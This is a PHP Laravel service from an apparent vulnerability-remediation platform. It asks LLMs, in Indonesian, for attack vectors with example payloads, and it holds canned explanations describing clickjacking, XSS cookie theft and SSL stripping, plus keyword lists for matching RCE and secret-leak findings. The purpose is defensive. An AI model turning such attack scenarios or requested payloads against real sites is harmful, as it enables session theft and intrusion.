<?php

namespace App\Services;

use App\Models\Finding;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class AiRemediationService
{
    /**
     * Generate comprehensive AI remediation guidance for a security finding.
     */
    public function generateGuidance(Finding $finding): array
    {
        $finding->loadMissing(['project', 'scanJob', 'scanRun']);

        // Cache key based on finding ID and last updated timestamp
        $cacheKey = "ai_remediation_gemini_{$finding->id}_" . ($finding->updated_at?->timestamp ?? 0);
        $cached = Cache::get($cacheKey);
        if ($cached && is_array($cached) && !empty($cached['summary'])) {
            return $cached;
        }

        $provider = config('secsys.ai.provider', env('AI_PROVIDER', 'auto'));
        $guidance = null;

        // Attempt live LLM generation if configured
        if ($provider !== 'heuristic') {
            try {
                $guidance = $this->tryGenerateLlmGuidance($finding, $provider);
            } catch (\Throwable $e) {
                Log::warning('LLM generation encountered an error, falling back to local cyber intelligence engine: ' . $e->getMessage(), [
                    'finding_id' => $finding->id,
                    'provider' => $provider,
                ]);
            }
        }

        // Fallback to advanced built-in Cyber Intelligence engine
        if (! $guidance) {
            $guidance = $this->generateAdvancedHeuristicGuidance($finding);
        }

        // Cache for 24 hours
        Cache::put($cacheKey, $guidance, 86400);

        return $guidance;
    }

    /**
     * Call external LLM provider (Google Gemini, OpenAI, DeepSeek, or Ollama).
     */
    private function tryGenerateLlmGuidance(Finding $finding, string $provider): ?array
    {
        $geminiKey = config('secsys.ai.gemini_api_key', env('GEMINI_API_KEY'));
        $openaiKey = config('secsys.ai.openai_api_key', env('OPENAI_API_KEY'));
        $deepseekKey = config('secsys.ai.deepseek_api_key', env('DEEPSEEK_API_KEY'));
        $ollamaHost = config('secsys.ai.ollama_host', env('OLLAMA_HOST'));

        // 1. Google Gemini
        if (($provider === 'gemini' || ($provider === 'auto' && $geminiKey)) && !empty($geminiKey)) {
            return $this->callGeminiApi($finding, $geminiKey);
        }

        // 2. OpenAI
        if (($provider === 'openai' || ($provider === 'auto' && $openaiKey)) && !empty($openaiKey)) {
            return $this->callOpenAiApi($finding, $openaiKey);
        }

        // 3. DeepSeek
        if (($provider === 'deepseek' || ($provider === 'auto' && $deepseekKey)) && !empty($deepseekKey)) {
            return $this->callDeepSeekApi($finding, $deepseekKey);
        }

        // 4. Ollama (Local LLM)
        if (($provider === 'ollama' || ($provider === 'auto' && $ollamaHost)) && !empty($ollamaHost)) {
            return $this->callOllamaApi($finding, $ollamaHost);
        }

        return null;
    }

    /**
     * Call Google Gemini API (gemini-3.5-flash / gemini-3.5-flash-lite)
     */
    private function callGeminiApi(Finding $finding, string $apiKey): ?array
    {
        $configuredModel = config('secsys.ai.gemini_model', env('GEMINI_MODEL', 'gemini-3.5-flash'));
        // Sanitize outdated model names like 1.5-flash or 2.0-flash to current active release
        if (Str::contains($configuredModel, ['1.5', '2.0', '2.5-flash-lite', '2.5-flash'])) {
            $configuredModel = 'gemini-3.5-flash';
        }

        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 30));
        $prompt = $this->buildLlmPrompt($finding);

        $payload = [
            'contents' => [
                [
                    'role' => 'user',
                    'parts' => [
                        ['text' => $prompt],
                    ],
                ],
            ],
            'generationConfig' => [
                'responseMimeType' => 'application/json',
                'temperature' => 0.2,
                'maxOutputTokens' => 4096,
            ],
        ];

        // Primary model with fallback
        $modelsToTry = array_unique([$configuredModel, 'gemini-3.5-flash-lite', 'gemini-3.5-flash']);

        foreach ($modelsToTry as $model) {
            $url = "https://generativelanguage.googleapis.com/v1beta/models/{$model}:generateContent?key={$apiKey}";

            try {
                $response = Http::timeout($timeout)->post($url, $payload);

                if (! $response->successful()) {
                    Log::warning("Gemini API request failed for model {$model}: " . $response->status() . ' - ' . $response->body());
                    continue;
                }

                $json = $response->json();
                $rawText = null;
                $parts = data_get($json, 'candidates.0.content.parts', []);
                foreach ($parts as $part) {
                    if (!empty($part['text'])) {
                        $rawText = $part['text'];
                        break;
                    }
                }

                if (! $rawText) {
                    continue;
                }

                $cleanJson = preg_replace('/^```(?:json)?\s*|\s*```$/m', '', trim($rawText));
                $parsed = json_decode($cleanJson, true);
                if (! is_array($parsed) || empty($parsed['summary'])) {
                    continue;
                }

                $modelBadge = "Google Gemini (" . strtoupper(str_replace('gemini-', '', $model)) . ")";
                return $this->formatLlmResult($finding, $parsed, $modelBadge, 'gemini');
            } catch (\Throwable $e) {
                Log::warning("Gemini API exception on {$model}: " . $e->getMessage());
            }
        }

        return null;
    }

    /**
     * Call OpenAI API (gpt-4o / gpt-4o-mini / gpt-3.5-turbo)
     */
    private function callOpenAiApi(Finding $finding, string $apiKey): ?array
    {
        $model = config('secsys.ai.openai_model', env('OPENAI_MODEL', 'gpt-4o-mini'));
        $url = 'https://api.openai.com/v1/chat/completions';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 15));

        $prompt = $this->buildLlmPrompt($finding);

        $response = Http::withToken($apiKey)
            ->timeout($timeout)
            ->post($url, [
                'model' => $model,
                'messages' => [
                    [
                        'role' => 'system',
                        'content' => 'You are an expert Application Security and DevSecOps specialist. Respond in valid JSON only with deep, concrete cybersecurity analysis.',
                    ],
                    [
                        'role' => 'user',
                        'content' => $prompt,
                    ],
                ],
                'response_format' => ['type' => 'json_object'],
                'temperature' => 0.2,
            ]);

        if (! $response->successful()) {
            Log::warning('OpenAI API request failed: ' . $response->status() . ' - ' . $response->body());
            return null;
        }

        $rawText = data_get($response->json(), 'choices.0.message.content');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "OpenAI " . strtoupper($model), 'openai');
    }

    /**
     * Call DeepSeek API
     */
    private function callDeepSeekApi(Finding $finding, string $apiKey): ?array
    {
        $model = config('secsys.ai.deepseek_model', env('DEEPSEEK_MODEL', 'deepseek-chat'));
        $url = 'https://api.deepseek.com/chat/completions';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 15));

        $prompt = $this->buildLlmPrompt($finding);

        $response = Http::withToken($apiKey)
            ->timeout($timeout)
            ->post($url, [
                'model' => $model,
                'messages' => [
                    [
                        'role' => 'system',
                        'content' => 'You are a senior Application Security and DevSecOps engineer. Output valid JSON only.',
                    ],
                    [
                        'role' => 'user',
                        'content' => $prompt,
                    ],
                ],
                'response_format' => ['type' => 'json_object'],
                'temperature' => 0.2,
            ]);

        if (! $response->successful()) {
            return null;
        }

        $rawText = data_get($response->json(), 'choices.0.message.content');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "DeepSeek Intelligence", 'deepseek');
    }

    /**
     * Call Ollama local model API
     */
    private function callOllamaApi(Finding $finding, string $host): ?array
    {
        $model = config('secsys.ai.ollama_model', env('OLLAMA_MODEL', 'llama3'));
        $url = rtrim($host, '/') . '/api/generate';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 20));

        $prompt = $this->buildLlmPrompt($finding) . "\n\nCRITICAL: Respond ONLY with a valid JSON object matching the requested schema. Do not enclose in markdown blocks.";

        $response = Http::timeout($timeout)->post($url, [
            'model' => $model,
            'prompt' => $prompt,
            'format' => 'json',
            'stream' => false,
        ]);

        if (! $response->successful()) {
            return null;
        }

        $rawText = $response->json('response');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "Ollama Local AI ({$model})", 'ollama');
    }

    /**
     * Build standard prompt for the LLM.
     */
    private function buildLlmPrompt(Finding $finding): string
    {
        $projectName = $finding->project?->name ?? 'Aplikasi Web';
        $engine = $finding->engine_key ?? 'Security Scanner';
        $filePath = $finding->file_path ?? ($finding->endpoint ?? 'Web Server Configuration');
        $lineInfo = $finding->line_start ? "Baris {$finding->line_start}" . ($finding->line_end ? "-{$finding->line_end}" : "") : 'Header HTTP / Konfigurasi Global';
        $evidence = !empty($finding->evidence_summary) ? json_encode($finding->evidence_summary, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) : 'Tidak ada potongan bukti langsung.';

        return <<<PROMPT
Anda adalah AI Spesialis Keamanan Siber Aplikasi (Senior DevSecOps & Certified Penetration Tester) tingkat dunia untuk platform TAMENG.
Berikan analisis kerentanan dan rekomendasi perbaikan kode (remediation patch) yang mendalam, presisi, canggih, dan dapat langsung dieksekusi oleh developer.

KONTEKS TEMUAN:
- Judul Temuan: {$finding->title}
- Scanner Engine: {$engine}
- Aturan / Rule ID: {$finding->rule_id}
- Tingkat Keparahan: {$finding->severity}
- Project Target: {$projectName}
- Lokasi Berkas / Endpoint: {$filePath}
- Baris Kode: {$lineInfo}
- CWE: {$finding->cwe}
- OWASP: {$finding->owasp}
- CVSS: {$finding->cvss}
- Bukti Kerentanan / Evidence:
{$evidence}

INSTRUKSI:
Kembalikan respon HANYA dalam format JSON valid (Bahasa Indonesia teknis yang formal dan profesional) dengan skema berikut:
{
  "category": "Nama kategori kerentanan yang spesifik (misal: Cross-Site Scripting, Missing Security Headers, SQL Injection)",
  "summary": "Penjelasan mendalam dan teknis mengapa celah ini terjadi pada konteks berkas/konfigurasi ini (2-3 kalimat)",
  "cause": "Akar masalah teknis utama dari kerentanan ini",
  "attack_vector": "Skenario nyata bagaimana penyerang (attacker) dapat mengeksploitasi celah ini langkah-demi-langkah beserta contoh payload",
  "business_impact": "Dampak terhadap bisnis, data sensitif, reputasi, atau kepatuhan regulasi (misal UU PDP / ISO 27001 / PCI-DSS)",
  "vulnerable_code": "Snippet kode atau konfigurasi yang rentan",
  "secure_code": "Snippet kode perbaikan yang aman dan siap diimplementasikan",
  "code_diff": "Perbandingan jelas kode sebelum dan sesudah perbaikan (bisa format unified diff atau format SEBELUM vs SESUDAH)",
  "mitigation_checklist": [
    "Langkah perbaikan 1 yang spesifik",
    "Langkah perbaikan 2",
    "Langkah perbaikan 3",
    "Langkah perbaikan 4"
  ],
  "verification_command": "Perintah CLI atau metode testing untuk memverifikasi perbaikan (contoh: perintah curl, npm audit, atau unit test)",
  "defense_in_depth": "Rekomendasi arsitektur keamanan berlapis tambahan untuk mencegah celah serupa"
}
PROMPT;
    }

    /**
     * Format LLM API result into standard TAMENG AI response structure.
     */
    private function formatLlmResult(Finding $finding, array $parsed, string $modelName, string $badgeType): array
    {
        $codeDiff = $parsed['code_diff'] ?? null;
        if (! $codeDiff && (!empty($parsed['vulnerable_code']) || !empty($parsed['secure_code']))) {
            $codeDiff = "--- KONDISI RENTAN:\n" . ($parsed['vulnerable_code'] ?? '') . "\n\n+++ SOLUSI PERBAIKAN AMAN:\n" . ($parsed['secure_code'] ?? '');
        }

        return [
            'finding_id' => $finding->id,
            'finding_code' => $finding->code,
            'rule_id' => $finding->rule_id,
            'title' => $finding->title,
            'severity' => $finding->severity,
            'category' => $parsed['category'] ?? ($finding->title ?: 'Security Vulnerability'),
            'summary' => $parsed['summary'] ?? '',
            'cause' => $parsed['cause'] ?? null,
            'attack_vector' => $parsed['attack_vector'] ?? '',
            'business_impact' => $parsed['business_impact'] ?? '',
            'code_diff' => $codeDiff,
            'vulnerable_code' => $parsed['vulnerable_code'] ?? null,
            'secure_code' => $parsed['secure_code'] ?? null,
            'mitigation_checklist' => is_array($parsed['mitigation_checklist'] ?? null) ? $parsed['mitigation_checklist'] : [],
            'verification_command' => $parsed['verification_command'] ?? null,
            'compliance' => [
                'cwe' => $finding->cwe ?: ($parsed['cwe'] ?? 'CWE-699: Software Development Concepts'),
                'owasp' => $finding->owasp ?: ($parsed['owasp'] ?? 'OWASP Top 10'),
                'cvss_score' => $finding->cvss ?? $this->defaultCvss($finding->severity),
            ],
            'owasp_guidance' => [
                'top_10_category' => $finding->owasp ?: 'OWASP Top 10 Application Security Risks',
                'defense_in_depth' => $parsed['defense_in_depth'] ?? 'Terapkan validasi input ketat, otorisasi berlapis (RBAC), dan enkripsi transmisi data.',
                'verification_method' => $parsed['verification_command'] ?? 'Jalankan ulang pemindaian TAMENG untuk memvalidasi perbaikan.',
            ],
            'ai_model' => $modelName,
            'ai_badge' => $badgeType,
            'is_live_llm' => true,
            'disclaimer' => "TAMENG {$modelName}: Analisis keamanan berbasis AI canggih. Selalu verifikasi dan lakukan regression testing pada lingkungan staging sebelum menerapkan patch ke production.",
        ];
    }

    /**
     * High-grade built-in Cyber Intelligence engine when live LLM is unconfigured or offline.
     */
    private function generateAdvancedHeuristicGuidance(Finding $finding): array
    {
        $category = $this->categorizeFinding($finding);
        $fileExt = strtolower(pathinfo($finding->file_path ?? '', PATHINFO_EXTENSION) ?: 'php');

        $explanation = $this->buildExplanation($finding, $category);
        $patchData = $this->buildCodePatch($finding, $category, $fileExt);
        $mitigations = $this->buildMitigationSteps($finding, $category);
        $owaspGuidance = $this->buildOwaspGuidance($finding);

        // Format code_diff nicely as unified diff or side-by-side string if it's an array
        $diffString = '';
        if (is_array($patchData)) {
            $filePath = $patchData['file_path'] ?? 'Berkas Terkait';
            $diffString = "--- SEBELUM [{$filePath}] (Kondisi Rentan):\n" . ($patchData['vulnerable_code'] ?? '') . "\n\n+++ SESUDAH (Solusi Perbaikan Direkomendasikan):\n" . ($patchData['secure_code'] ?? '');
        } else {
            $diffString = (string) $patchData;
        }

        return [
            'finding_id' => $finding->id,
            'finding_code' => $finding->code,
            'rule_id' => $finding->rule_id,
            'title' => $finding->title,
            'severity' => $finding->severity,
            'category' => $category['name'],
            'summary' => $explanation['summary'],
            'cause' => $explanation['cause'] ?? null,
            'attack_vector' => $explanation['attack_vector'],
            'business_impact' => $explanation['impact'],
            'code_diff' => $diffString,
            'vulnerable_code' => $patchData['vulnerable_code'] ?? null,
            'secure_code' => $patchData['secure_code'] ?? null,
            'mitigation_checklist' => $mitigations,
            'verification_command' => $explanation['verification'] ?? null,
            'compliance' => [
                'cwe' => $finding->cwe ?: $category['cwe'],
                'owasp' => $finding->owasp ?: $category['owasp'],
                'cvss_score' => $finding->cvss ?? $this->defaultCvss($finding->severity),
            ],
            'owasp_guidance' => $owaspGuidance,
            'ai_model' => 'TAMENG Cyber Intelligence Engine v3.0 (Expert Heuristic)',
            'ai_badge' => 'tameng-ai',
            'is_live_llm' => false,
            'disclaimer' => 'TAMENG Cyber Intelligence: Analisis keamanan otomatis berstandar OWASP & CIS Benchmarks. Selalu tinjau arsitektur aplikasi dan jalankan testing sebelum deploy ke production.',
        ];
    }

    private function categorizeFinding(Finding $finding): array
    {
        $rule = strtolower($finding->rule_id ?? '');
        $title = strtolower($finding->title ?? '');
        $engine = strtolower($finding->engine_key ?? '');
        $filePath = strtolower($finding->file_path ?? '');
        $cve = strtolower($finding->cve ?? '');
        $package = data_get($finding->evidence_summary, 'package');

        // 1. Vulnerable Dependency (SCA - OSV, Trivy, Grype, Dependency-Check, lockfiles, CVEs, GHSAs)
        $isDependencyEngine = in_array($engine, ['osv', 'trivy', 'grype', 'dependency-check', 'dependabot', 'snyk']);
        $isDependencyFile = Str::contains($filePath, ['composer.lock', 'composer.json', 'package.json', 'package-lock.json', 'yarn.lock', 'pnpm-lock', 'requirements.txt', 'gemfile', 'go.mod', 'pom.xml', 'build.gradle']);
        $isDependencyRule = Str::startsWith($rule, ['ghsa-', 'cve-', 'pysec-', 'govuln-']) || Str::contains($rule, ['cve', 'trivy', 'osv', 'package', 'dependency', 'ghsa', 'vulnerable-dependency']);
        $isDependencyTitle = Str::contains($title, ['vulnerable dependency', 'outdated', 'cve-', 'ghsa-']) || !empty($package) || !empty($cve);

        if ($isDependencyEngine || $isDependencyFile || $isDependencyRule || $isDependencyTitle) {
            $pkgName = is_string($package) && !empty($package) ? $package : ($finding->cve ?: ($finding->rule_id ?: 'Third-Party Package'));
            return [
                'type' => 'vulnerable_dependency',
                'name' => "Vulnerable Dependency: {$pkgName}",
                'cwe' => $finding->cwe ?: 'CWE-1395: Dependency on Vulnerable Third-Party Component',
                'owasp' => $finding->owasp ?: 'A06:2021-Vulnerable and Outdated Components',
            ];
        }

        // 2. Clickjacking
        if (Str::contains($rule, ['clickjacking', 'x-frame-options', '10020']) || Str::contains($title, ['clickjacking', 'x-frame-options', 'anti-clickjacking'])) {
            return [
                'type' => 'clickjacking',
                'name' => 'Missing Anti-Clickjacking Header (X-Frame-Options)',
                'cwe' => 'CWE-1021: Improper Restriction of Rendered UI Layers or Frames',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 3. CSP (Content Security Policy)
        if (Str::contains($rule, ['content-security-policy', 'csp', '10038', '10055']) || Str::contains($title, ['content security policy', 'csp header'])) {
            return [
                'type' => 'csp_missing',
                'name' => 'Content Security Policy (CSP) Not Configured',
                'cwe' => 'CWE-358: Improperly Implemented Security Check for Standard',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 4. X-Content-Type-Options
        if (Str::contains($rule, ['x-content-type-options', 'nosniff', '10021']) || Str::contains($title, ['x-content-type-options', 'nosniff'])) {
            return [
                'type' => 'x_content_type_options',
                'name' => 'Missing X-Content-Type-Options Header (MIME-Sniffing)',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 5. HSTS (Strict-Transport-Security)
        if (Str::contains($rule, ['strict-transport-security', 'hsts', '10035']) || Str::contains($title, ['strict-transport-security', 'hsts'])) {
            return [
                'type' => 'hsts_missing',
                'name' => 'Missing HTTP Strict Transport Security (HSTS)',
                'cwe' => 'CWE-319: Cleartext Transmission of Sensitive Information',
                'owasp' => 'A02:2021-Cryptographic Failures',
            ];
        }

        // 6. Permissions-Policy
        if (Str::contains($rule, ['permissions-policy', 'feature-policy', '10063']) || Str::contains($title, ['permissions policy', 'feature policy'])) {
            return [
                'type' => 'permissions_policy',
                'name' => 'Missing Permissions-Policy Header',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 7. COEP / COOP (Cross-Origin Policies)
        if (Str::contains($rule, ['cross-origin-embedder', 'cross-origin-opener', 'coep', 'coop', '90004', '90005']) || Str::contains($title, ['cross-origin-embedder', 'cross-origin-opener', 'coep'])) {
            return [
                'type' => 'coep_coop',
                'name' => 'Missing Cross-Origin Isolation Headers (COEP/COOP)',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 8a. SSL/TLS Certificate Chain & Trust Validation
        if (Str::contains($rule, ['cert_chain', 'chain_of_trust', 'certificate_chain', 'incomplete-chain', 'cert_trust']) || Str::contains($title, ['chain of trust', 'certificate chain', 'cert chain', 'incomplete chain'])) {
            return [
                'type' => 'ssl_cert_chain',
                'name' => 'SSL/TLS Certificate Chain Validation & Trust Path',
                'cwe' => 'CWE-295: Improper Certificate Validation',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 8b. BREACH / CRIME Attack (Compression-based oracle attack)
        if (Str::contains($rule, ['breach', 'crime']) || Str::contains($title, ['breach', 'crime'])) {
            return [
                'type' => 'breach_attack',
                'name' => 'TLS/SSL: BREACH Attack Vulnerability (HTTP Compression over TLS)',
                'cwe' => 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
                'owasp' => 'A02:2021-Cryptographic Failures',
            ];
        }

        // 8c. SSL / TLS / Cipher Weaknesses
        if (Str::contains($rule, ['weak-cipher', 'deprecated-tls', 'tls-version', 'ssl-issuer', 'wildcard-tls', 'ssl-dns-names', 'testssl', 'cipher']) || Str::contains($title, ['cipher', 'tls', 'ssl'])) {
            return [
                'type' => 'weak_ssl_ciphers',
                'name' => 'TLS/SSL Cryptographic Configuration & Cipher Suites',
                'cwe' => 'CWE-326: Inadequate Encryption Strength',
                'owasp' => 'A02:2021-Cryptographic Failures',
            ];
        }

        // 9. Cache-Control & Storable Content
        if (Str::contains($rule, ['cache-control', 'storable', 'cacheable', '10015', '10049', '10050']) || Str::contains($title, ['cache-control', 'cacheable', 'cache'])) {
            return [
                'type' => 'cache_control',
                'name' => 'HTTP Cache-Control Directives & Sensitive Data Caching',
                'cwe' => 'CWE-524: Use of Cache Containing Sensitive Information',
                'owasp' => 'A01:2021-Broken Access Control',
            ];
        }

        // 10. Secrets / Credentials (Gitleaks, Trufflehog, API keys)
        if (in_array($engine, ['gitleaks', 'trufflehog']) || Str::contains($rule, ['secret', 'gitleaks', 'key', 'token', 'password', 'credential', 'auth-token', 'private-key', 'api-key']) || Str::contains($title, ['secret', 'token', 'credential', 'api key', 'password', 'private key'])) {
            return [
                'type' => 'secret_leak',
                'name' => 'Hardcoded Secrets & Credential Exposure',
                'cwe' => 'CWE-798: Use of Hard-coded Credentials',
                'owasp' => 'A07:2021-Identification and Authentication Failures',
            ];
        }

        // 11. SQL Injection
        if (Str::contains($rule, ['sql', 'sqli', 'injection', 'tainted-sql']) || Str::contains($title, ['sql injection', 'sqli', 'raw query', 'tainted sql'])) {
            return [
                'type' => 'sql_injection',
                'name' => 'SQL Injection (SQLi) Vulnerability',
                'cwe' => 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 12. XSS (Cross-Site Scripting)
        if (Str::contains($rule, ['xss', 'cross-site-scripting', 'dangerouslysetinnerhtml', 'unescaped']) || Str::contains($title, ['cross-site scripting', 'xss'])) {
            return [
                'type' => 'xss',
                'name' => 'Cross-Site Scripting (XSS)',
                'cwe' => 'CWE-79: Improper Neutralization of Input During Web Page Generation',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 13. Subresource Integrity (SRI)
        if (Str::contains($rule, ['integrity', 'sri', 'subresource']) || Str::contains($title, ['subresource integrity', 'integrity attribute'])) {
            return [
                'type' => 'sri_missing',
                'name' => 'Subresource Integrity (SRI) Attribute Missing',
                'cwe' => 'CWE-353: Missing Support for Integrity Check',
                'owasp' => 'A08:2021-Software and Data Integrity Failures',
            ];
        }

        // 14. RCE / Command Injection
        if (Str::contains($rule, ['rce', 'eval', 'exec', 'command-injection', 'unserialize', 'system', 'command execution']) || Str::contains($title, ['remote code execution', 'command injection', 'code execution', 'command execution'])) {
            return [
                'type' => 'rce',
                'name' => 'Remote Code Execution / OS Command Injection',
                'cwe' => 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 15. SSRF (Server-Side Request Forgery)
        if (Str::contains($rule, ['ssrf', 'request-forgery', 'server-side request']) || Str::contains($title, ['ssrf', 'server-side request forgery'])) {
            return [
                'type' => 'ssrf',
                'name' => 'Server-Side Request Forgery (SSRF)',
                'cwe' => 'CWE-918: Server-Side Request Forgery (SSRF)',
                'owasp' => 'A10:2021-Server-Side Request Forgery (SSRF)',
            ];
        }

        // 16. Path Traversal / LFI
        if (Str::contains($rule, ['traversal', 'path-traversal', 'lfi', 'file-inclusion']) || Str::contains($title, ['path traversal', 'directory traversal', 'file inclusion'])) {
            return [
                'type' => 'path_traversal',
                'name' => 'Path Traversal & Local File Inclusion (LFI)',
                'cwe' => 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
                'owasp' => 'A01:2021-Broken Access Control',
            ];
        }

        // 17. CSRF (Cross-Site Request Forgery)
        if (Str::contains($rule, ['csrf', 'xsrf', 'cross-site request']) || Str::contains($title, ['csrf', 'cross-site request forgery'])) {
            return [
                'type' => 'csrf',
                'name' => 'Cross-Site Request Forgery (CSRF)',
                'cwe' => 'CWE-352: Cross-Site Request Forgery (CSRF)',
                'owasp' => 'A01:2021-Broken Access Control',
            ];
        }

        // 18. Server Misconfiguration (Nikto / Generic)
        if (Str::contains($rule, ['nikto', 'misconfig', 'cors', 'security-header', 'cookie', 'helmet']) || Str::contains($title, ['nikto', 'cors', 'header', 'cookie', 'server'])) {
            return [
                'type' => 'misconfig',
                'name' => 'Web Server Security Misconfiguration',
                'cwe' => 'CWE-16: Configuration Errors',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        return [
            'type' => 'generic',
            'name' => $finding->title ? "Security Weakness: " . Str::limit($finding->title, 45) : 'Security Weakness / Code Quality Issue',
            'cwe' => $finding->cwe ?: 'CWE-699: Software Development Concepts',
            'owasp' => $finding->owasp ?: 'A04:2021-Insecure Design',
        ];
    }

    private function buildExplanation(Finding $finding, array $category): array
    {
        return match ($category['type']) {
            'clickjacking' => [
                'summary' => 'Server web belum mengonfigurasi header respon anti-framing (X-Frame-Options atau CSP frame-ancestors). Kondisi ini mengizinkan halaman aplikasi dimuat di dalam iframe situs eksternal yang dikendalikan pihak lain.',
                'cause' => 'Web server Nginx/Apache atau middleware HTTP framework aplikasi belum mengirimkan instruksi pembatasan rendering frame pada setiap respon HTTP.',
                'attack_vector' => "1. Penyerang membuat website jebakan (e.g. evil-portal.com).\n2. Halaman aplikasi Anda disematkan ke dalam <iframe> transparan dengan opacity: 0 tepat di atas tombol menggiurkan (misal tombol 'Klaim Hadiah').\n3. Saat korban mengklik tombol palsu, browser mengeksekusi klik pada tombol asli aplikasi Anda (seperti 'Hapus Akun' atau 'Transfer Dana').",
                'impact' => 'Pembajakan aksi pengguna (Clickjacking/UI Redressing), manipulasi transaksi tanpa disadari, pengubahan kredensial, dan pencurian otorisasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "X-Frame-Options"',
            ],
            'csp_missing' => [
                'summary' => 'Header Content-Security-Policy (CSP) tidak ditemukan pada respon HTTP. Browser klien tidak memiliki batasan sumber eksekusi script, stylesheet, koneksi WebSocket, maupun objek media eksternal.',
                'cause' => 'Tidak adanya deklarasi kebijakan CSP pada level reverse-proxy atau application middleware untuk mengontrol asal (origins) sumber daya yang boleh dieksekusi.',
                'attack_vector' => "1. Penyerang menyuntikkan payload JavaScript jahat via celah input atau third-party CDN yang disusupi.\n2. Tanpa CSP, browser langsung mengeksekusi skrip tersebut dan mengirimkan session cookies/JWT ke server penyerang (exfiltration).",
                'impact' => 'Eksekusi Cross-Site Scripting (XSS) skala penuh, pembajakan token sesi, data tampering, dan defacement antarmuka web.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Content-Security-Policy"',
            ],
            'x_content_type_options' => [
                'summary' => 'Header X-Content-Type-Options: nosniff tidak dikirimkan oleh server. Browser klien berpotensi mengabaikan tipe MIME resmi dan menebak tipe konten melalui teknik MIME-sniffing.',
                'cause' => 'Web server belum memblokir perilaku bawaan browser lama yang mencoba mengeksekusi konten non-script (seperti gambar .jpg atau file .txt) sebagai JavaScript.',
                'attack_vector' => "1. Penyerang mengunggah file gambar profil yang disisipi kode JavaScript di dalamnya (Polyglot file).\n2. Saat diakses via browser korban, browser melakukan MIME-sniffing dan mengeksekusi kode script tersebut seolah-olah file JavaScript resmi.",
                'impact' => 'Bypass filter upload berkas dan eksekusi skrip tak sah pada domain aplikasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "X-Content-Type-Options"',
            ],
            'hsts_missing' => [
                'summary' => 'Header Strict-Transport-Security (HSTS) belum diaktifkan pada server HTTPS. Browser tidak dipaksa untuk selalu menggunakan koneksi terenkripsi.',
                'cause' => 'Konfigurasi SSL/TLS pada Nginx/Apache belum menyertakan direktif max-age dan includeSubDomains pada header Strict-Transport-Security.',
                'attack_vector' => "1. Pengguna terhubung ke Wi-Fi publik (kafe/bandara).\n2. Penyerang di jaringan yang sama melakukan serangan ARP spoofing dan SSL Stripping (mengarahkan akses pertama korban dari HTTPS ke HTTP biasa tanpa enkripsi).\n3. Semua kredensial dan data form korban disadap dalam bentuk teks polos.",
                'impact' => 'Penyadapan lalu lintas data sensitif, pencurian password akun, dan pembajakan sesi komunikasi klien-server.',
                'verification' => 'curl -s -D- https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Strict-Transport-Security"',
            ],
            'permissions_policy' => [
                'summary' => 'Header Permissions-Policy belum diatur. Fitur perangkat keras browser klien (kamera, mikrofon, lokasi GPS, sensor akselerometer) tidak dibatasi secara eksplisit.',
                'cause' => 'Tidak adanya batasan izin kapabilitas browser modern untuk dokumen utama maupun iframe pihak ketiga.',
                'attack_vector' => "1. Skrip pihak ketiga (analytics/ads widget) atau iframe yang disusupi mencoba mengakses API navigator.mediaDevices atau geolocation secara diam-diam.\n2. Tanpa Permissions-Policy, pembatasan akses hanya bergantung pada pop-up izin browser yang rentan terhadap rekayasa sosial.",
                'impact' => 'Pelanggaran privasi data pribadi pengguna (UU PDP), potensi pelacakan lokasi fisik tanpa izin.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Permissions-Policy"',
            ],
            'coep_coop' => [
                'summary' => 'Header isolasi lingkungan Cross-Origin (COEP / COOP) belum disetel. Dokumen aplikasi tidak terisolasi dari window/tab lain yang dibuka oleh browser.',
                'cause' => 'Web server belum menyertakan Cross-Origin-Embedder-Policy dan Cross-Origin-Opener-Policy pada respon HTTP.',
                'attack_vector' => "1. Penyerang membuat halaman web jebakan yang membuka tab ke aplikasi Anda (window.open).\n2. Dengan memanipulasi referensi window dan memanfaatkan serangan side-channel memori browser (seperti Spectre), penyerang dapat membaca potongan data sensitif dari memori proses browser.",
                'impact' => 'Kebocoran data rahasia lintas konteks tab browser dan penurunan derajat isolasi komputasi klien.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Cross-Origin"',
            ],
